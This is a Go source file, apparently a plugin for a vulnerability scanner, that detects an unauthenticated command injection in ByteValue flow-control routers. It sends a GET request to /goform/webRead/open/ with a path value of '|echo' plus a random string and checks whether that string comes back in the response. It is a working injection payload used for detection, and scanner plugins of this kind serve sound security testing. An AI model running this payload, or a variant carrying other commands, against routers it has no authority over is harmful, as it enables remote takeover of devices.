package goplugin

import (
	"Yscanner/utils"
	"net/http"
	"strings"
)

func init() {
	Register("bytevalue_rce", &bytevalue_rce{})
}

type bytevalue_rce struct{}

func (p *bytevalue_rce) Info() PluginInfo {
	return PluginInfo{
		Name:     "ByteValue 任意代码执行漏洞",
		VulnInfo: "百为智能流控路由器/goform/webRead/open路由的?path参数存在有回显的命令注入漏洞,未经身份认证的攻击者可以利用此漏洞执行任意指令，获取服务器权限。",
		VulnID:   "",
		Level:    "CRITICAL",
		URL:      "",
		Version:  "",
		CWE:      "",
	}
}

func (p *bytevalue_rce) Check(netloc string) bool {
	rand_str := utils.GenRandom(10)
	payload := "/goform/webRead/open/?path=|echo%20" + rand_str
	req, err := http.NewRequest("GET", netloc+payload, nil)
	if err != nil {
		return false
	}
	resp, err := utils.RequestDo(req, true, 2)
	if err != nil {
		return false
	}
	if resp.Other.StatusCode == 200 && strings.Contains(resp.ResponseRaw, rand_str) {
		return true
	}
	return false
}
